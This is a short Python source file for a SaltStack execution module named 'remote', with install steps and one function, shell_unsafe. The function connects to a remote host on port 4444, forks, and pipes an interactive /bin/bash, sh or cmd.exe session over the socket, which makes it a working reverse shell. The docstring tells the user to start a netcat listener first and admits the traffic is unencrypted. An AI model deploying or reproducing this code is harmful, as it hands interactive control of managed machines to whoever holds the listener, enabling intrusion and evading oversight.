__virtualname__ = 'remote'

import socket
import subprocess
import os

'''
copy file(s) to:
/srv/salt/base/_modules/remote

run:
salt-call saltutil.sync_all
'''

def shell_unsafe(cmd='/bin/bash -i', remote_system=None, remote_port=4444):
    '''
    starts streaming a program to a remote server.
    traffic is in clear text and unsafe!
    
    first start a listen on the remote system:
        nc -l 4444
    
    args:
        cmd='/bin/bash -i'
        cmd='/bin/sh -i'
        cmd='cmd.exe'
    '''
    if not remote_system:
        remote_system = __opts__['master']
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remote_system, remote_port))
    except socket.error as msg:
        s.close()
        return "connect error: you must first run 'nc -l {1}' on {0}".format(
            remote_system, remote_port)
    pid = os.fork()
    if pid > 0:
        return 'pid {3} streaming {0} to {1}:{2}'.format(cmd, remote_system, remote_port, pid)
    pip = s.makefile("rw")
    p = subprocess.call(cmd.split(' '), stdin=pip, stdout=pip, stderr=pip)
